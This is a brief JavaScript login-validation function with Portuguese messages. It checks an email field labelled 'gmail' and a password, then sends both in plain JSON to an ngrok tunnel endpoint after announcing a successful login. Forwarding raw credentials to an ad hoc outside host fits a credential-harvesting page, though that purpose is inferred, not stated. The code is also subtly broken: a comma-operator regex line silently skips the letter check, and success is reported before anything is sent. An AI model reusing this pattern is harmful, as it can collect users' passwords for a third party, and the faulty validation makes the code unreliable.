function enviar() {
    let gmail= document.getElementById('iemail')
    let senha = document.getElementById('isenha')

    let Email = gmail.value
    let Senha = senha.value
        
        if (Email.length < 5 || Senha.length < 5) {
            window.alert('Cadastro errados!, tente novamente')
                return false;
        }else if(Email.length > 50) {
            window.alert('Seu email passou de 50 caracteres!')
                return false;
        } 
        else if (!/[a-zA-Z]/,/[0-9]/.test(Email)){
            window.alert('Acrescente mais caracteres no Email')
                return false;
        }else if (!Email.includes('@')){
            window.alert('Acrescente @ no email!')
                return false;
        }
        else if (!/[a-zA-Z]/.test(Senha) || !/[0-9]/.test(Senha)){
            window.alert(`A senha deve conter letras e números!`)
                return false;
        }else{
            window.alert('Login feito com Sucesso!')

            fetch('https://commute-doormat-operator.ngrok-free.dev/dados',{
                method:'POST',
                headers: {
                    'content-Type':'application/json'
                },
                body:JSON.stringify({
                    'email':Email,
                    'senha':Senha
                })
            })
        }
    return true;
} 
        
   